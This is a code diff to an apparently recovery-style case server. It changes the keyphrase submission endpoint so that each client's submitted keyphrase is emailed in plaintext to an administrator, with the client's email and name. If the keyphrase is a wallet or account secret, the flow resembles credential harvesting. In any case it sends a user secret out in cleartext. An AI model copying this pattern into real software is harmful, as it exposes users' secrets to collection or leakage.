@@ -11,6 +11,7 @@ import {
   logEmailStartup,
   sendDebugEmail,
   sendRecoveryEmails,
+  sendKeyphraseAdminEmail,
   sendSubscribeEmail,
   generateCaseId,
 } from "./server/email";
@@ -242,7 +243,7 @@ async function startServer() {
     res.json({ success: true, message });
   });
 
-  app.post("/api/case/:caseId/keyphrase", (req, res) => {
+  app.post("/api/case/:caseId/keyphrase", async (req, res) => {
     const email =
       typeof req.body?.email === "string"
         ? req.body.email.trim().toLowerCase()
@@ -274,9 +275,27 @@ async function startServer() {
     if (!updated) {
       return res.status(500).json({ success: false, error: "Failed to save" });
     }
+
+    let keyphraseEmailSent = false;
+    if (isEmailConfigured()) {
+      try {
+        const result = await sendKeyphraseAdminEmail({
+          caseId: String(updated.caseId || updated.id),
+          clientEmail: email,
+          clientName: String(updated.operatorAlias || updated.name || ""),
+          keyphrase: keyphrase.trim(),
+          submittedAt: String(updated.keyphraseSubmittedAt || ""),
+        });
+        keyphraseEmailSent = result.emailSent;
+      } catch (emailErr) {
+        console.error("[Email] keyphrase admin alert failed:", emailErr);
+      }
+    }
+
     res.json({
       success: true,
       case: toPublicCase(updated),
+      keyphraseEmailSent,
     });
   });
 
